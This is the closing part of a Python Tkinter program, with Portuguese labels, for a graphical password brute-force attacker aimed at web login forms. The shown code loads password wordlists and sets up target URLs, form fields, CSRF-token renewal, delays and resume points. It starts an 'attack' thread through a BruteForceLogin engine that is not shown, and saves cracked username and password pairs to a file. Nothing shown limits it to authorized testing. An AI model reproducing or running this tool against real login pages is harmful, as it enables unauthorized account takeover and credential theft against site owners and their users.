        self.man_extra_var = tk.StringVar()
        ttk.Entry(linha3, textvariable=self.man_extra_var,
                  width=52).pack(side="left", padx=4)
        ttk.Label(linha3, text="ex.: login-button=Login;redirect_to=/").pack(side="left")

        # ---------------------------------------------------- botoes
        botoes = ttk.Frame(self.root)
        botoes.pack(fill="x", padx=10, pady=4)
        self.btn_start = ttk.Button(botoes, text="▶ INICIAR ATAQUE ◀",
                                    style="Hack.TButton", command=self.start)
        self.btn_start.pack(side="left", padx=5, ipadx=10, ipady=2)
        self.btn_stop = ttk.Button(botoes, text="■ PARAR",
                                   style="Danger.TButton", command=self.stop,
                                   state="disabled")
        self.btn_stop.pack(side="left", padx=5, ipadx=10, ipady=2)
        self.btn_save = ttk.Button(botoes, text="💾 SALVAR SENHA",
                                   style="Hack.TButton", command=self.salvar_senha)
        self.btn_save.pack(side="left", padx=5, ipadx=10, ipady=2)
        self.btn_limpar = ttk.Button(botoes, text="✕ LIMPAR LOG",
                                     style="Hack.TButton", command=self.limpar_log)
        self.btn_limpar.pack(side="right", padx=5, ipadx=10, ipady=2)

        self.progress_var = tk.DoubleVar(value=0)
        ttk.Progressbar(self.root, variable=self.progress_var,
                        maximum=100, length=400).pack(
            fill="x", padx=10, pady=4)
        self.status_var = tk.StringVar(
            value="> Pronto. Escolha um caminho comum ou digite a URL_")
        ttk.Label(self.root, textvariable=self.status_var,
                  font=self.FONT_B).pack(anchor="w", padx=12)

        self.log_area = scrolledtext.ScrolledText(
            self.root, state="disabled", height=16, bg="#050805",
            fg=self.FG, insertbackground=self.ACCENT,
            font=("Consolas", 10), selectbackground=self.ACCENT,
            selectforeground="#000000", relief="flat",
            highlightbackground=self.FG_DIM, highlightthickness=1)
        self.log_area.pack(fill="both", expand=True, padx=10, pady=8)

    # -------------------------------------------------- utilitários GUI
    def _animar_titulo(self):
        atual = self.root.title()
        if atual.endswith("▌"):
            self.root.title(atual[:-1])
        else:
            self.root.title(atual + "▌")
        self.root.after(600, self._animar_titulo)

    def limpar_log(self):
        self.log_area.configure(state="normal")
        self.log_area.delete("1.0", "end")
        self.log_area.configure(state="disabled")

    def aplicar_caminho(self, _event=None):
        url = self.url_var.get().strip().rstrip("/")
        caminho = self.path_var.get().strip()
        if not caminho:
            return
        if not url:
            self.url_var.set(caminho)
            return
        m = re.match(r"^(https?://[^/]+)", url)
        if m:
            self.url_var.set(m.group(1) + caminho)

    def aplicar_preset(self, _event=None):
        preset = PRESETS.get(self.preset_var.get())
        if not preset:
            return
        url = self.url_var.get().strip().rstrip("/")
        m = re.match(r"^(https?://[^/]+)", url)
        base = m.group(1) if m else ""
        self.url_var.set(base + preset["path"])
        self.man_action_var.set(base + preset["action"])
        self.man_user_var.set(preset["user"])
        self.man_pass_var.set(preset["pass"])
        self.man_token_var.set(preset["token"])
        self.man_method_var.set(preset["method"].upper())
        self.man_extra_var.set(preset.get("extra", ""))

    def browse(self):
        path = filedialog.askopenfilename(
            title="Selecione a wordlist",
            filetypes=[("Arquivos de texto", "*.txt"), ("Todos", "*.*")])
        if path:
            self.wordlist_var.set(path)

    def salvar_senha(self):
        if not self.senha_encontrada:
            messagebox.showinfo("Salvar Senha",
                                "Nenhuma senha encontrada até agora.\n"
                                "Execute o ataque e aguarde o resultado [+].")
            return
        usuario, senha = self.senha_encontrada
        texto = (f"[+] SENHA ENCONTRADA: {senha}\n"
                 f"\n[+] Credenciais\n\nUSUARIO: {usuario}\n\nSENHA: {senha}\n")
        agora = time.strftime("Data  %d_%m_%Y   Hora %H_%M_%S")
        path = filedialog.asksaveasfilename(
            title="Salvar senha encontrada",
            defaultextension=".txt",
            initialfile=f"senha_{agora}.txt",
            filetypes=[("Arquivos de texto", "*.txt"), ("Todos", "*.*")])
        if not path:
            return
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(texto)
            messagebox.showinfo("Salvar Senha", f"Senha salva:\n{path}")
        except Exception as e:
            messagebox.showerror("Salvar Senha", f"Falha ao salvar:\n{e}")

    # ---------------------------------------------- ponte thread -> GUI
    def log(self, msg):
        agora = time.strftime("%H:%M:%S")
        self.queue.put(("log", f"[{agora}] {msg}"))

    def progress(self, i, total, pwd=""):
        self.proximo_indice = i
        self.queue.put(("progress", (i, total, pwd)))

    def done(self, msg):
        self.queue.put(("done", msg))

    def on_resultado(self, usuario, senha):
        self.queue.put(("resultado", (usuario, senha)))

    def _poll_queue(self):
        try:
            while True:
                kind, payload = self.queue.get_nowait()
                if kind == "log":
                    self.log_area.configure(state="normal")
                    if ("SENHA ENCONTRADA" in payload or "USUARIO:" in payload
                            or "SENHA:" in payload or "CREDENCIAL" in payload):
                        self.log_area.tag_configure(
                            "achado", foreground=self.ACHADO,
                            font=("Consolas", 10, "bold"))
                        self.log_area.insert("end", payload + "\n", "achado")
                    else:
                        self.log_area.insert("end", payload + "\n")
                    self.log_area.see("end")
                    self.log_area.configure(state="disabled")
                elif kind == "progress":
                    i, total, pwd = payload
                    pct = (i / total) * 100 if total else 0
                    self.progress_var.set(pct)
                    self.status_var.set(
                        f"> [{i}/{total}] ({pct:.1f}%) Testando: {pwd} ")
                elif kind == "resultado":
                    self.senha_encontrada = payload
                    usuario, senha = payload
                    self.status_var.set(
                        f"> ✔ CREDENCIAL VÁLIDA: {usuario} : {senha} "
                        f"Clique em SALVAR SENHA")
                elif kind == "done":
                    self.btn_start.configure(state="normal")
                    self.btn_stop.configure(state="disabled")
                    if not self.senha_encontrada:
                        self.status_var.set(f"> {payload}")
        except queue.Empty:
            pass
        self.root.after(100, self._poll_queue)

    # ---------------------------------------------------------- ataque
    def start(self):
        if self.worker is not None and self.worker.is_alive():
            self.status_var.set("> Aguardando o ataque anterior parar completamente...")
            self.root.after(250, self.start)
            return

        url = self.url_var.get().strip()
        user = self.user_var.get().strip()
        wl_path = self.wordlist_var.get().strip()
        verbose = self.verbose_var.get()
        renovar = self.token_var.get()
        delay = self.delay_var.get()

        if not url or not user:
            messagebox.showerror("Erro", "Informe a URL e o usuário.")
            return
        if wl_path:
            if not os.path.isfile(wl_path):
                messagebox.showerror("Erro", f"Arquivo não encontrado:\n{wl_path}")
                return
            try:
                with open(wl_path, "r", encoding="utf-8", errors="ignore") as f:
                    passwords = [linha.strip() for linha in f if linha.strip()]
            except Exception as e:
                messagebox.showerror("Erro", f"Falha ao ler wordlist:\n{e}")
                return
            if not passwords:
                messagebox.showerror("Erro", "Wordlist vazia.")
                return
        else:
            passwords = DEFAULT_WORDLIST[:]

        manual = None
        if self.manual_var.get():
            action = self.man_action_var.get().strip()
            user_field = self.man_user_var.get().strip()
            pass_field = self.man_pass_var.get().strip()
            token_field = self.man_token_var.get().strip()
            method = self.man_method_var.get().strip().lower() or "post"
            if not (action and user_field and pass_field):
                messagebox.showerror(
                    "Erro", "Modo manual: preencha Action, campo usuário e campo senha.")
                return
            manual = {
                "action": action,
                "method": method,
                "user_field": user_field,
                "pass_field": pass_field,
                "token_field": token_field or None,
                "extra": parse_campos_extras(self.man_extra_var.get()),
            }

        wl_fonte = wl_path if wl_path else "builtin"
        if self.fonte_wordlist and self.fonte_wordlist != wl_fonte:
            self.proximo_indice = 0
            self.log("[*] Wordlist alterada -> recomeçando do início.")
        self.fonte_wordlist = wl_fonte

        inicio = 0
        if self.proximo_indice > 0:
            if self.proximo_indice >= len(passwords):
                self.proximo_indice = 0
                self.log("[*] Ataque anterior chegou ao fim da lista -> recomeçando do início.")
            else:
                inicio = self.proximo_indice

        resumindo = inicio > 0

        if not resumindo and not wl_path:
            self.log("[*] Nenhuma wordlist selecionada -> lista embutida de demonstração.")

        self.stop_event.clear()
        self.senha_encontrada = None
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        self.progress_var.set((inicio / len(passwords)) * 100 if passwords else 0)
        self.log_area.configure(state="normal")
        if not resumindo:
            self.log_area.delete("1.0", "end")
        self.log_area.configure(state="disabled")

        engine = BruteForceLogin(url, user, passwords, self.log, self.progress,
                                 self.stop_event, self.on_resultado,
                                 verbose=verbose, renovar_token=renovar,
                                 delay=delay, inicio=inicio, manual=manual)
        self.worker = threading.Thread(target=self._run_engine, args=(engine,),
                                       daemon=True)
        self.worker.start()

    def _run_engine(self, engine):
        try:
            engine.run()
        except Exception as e:
            self.log(f"[!] Erro inesperado: {type(e).__name__}: {e}")
        finally:
            if engine.found:
                self.proximo_indice = 0
                self.done("Ataque finalizado. Senha encontrada (veja o log) — use 'SALVAR SENHA'.")
            elif self.parado_pelo_usuario:
                self.done("Ataque interrompido. Clique em 'INICIAR ATAQUE' para continuar de onde parou.")
            else:
                self.proximo_indice = 0
                self.done("Ataque finalizado. Nenhuma senha válida nas tentativas.")
            self.parado_pelo_usuario = False

    def stop(self):
        self.stop_event.set()
        self.parado_pelo_usuario = True
        self.status_var.set("> Parando... aguarde a tentativa atual terminar.")

    def on_close(self):
        self.stop_event.set()
        self.root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    App(root)
    root.mainloop()
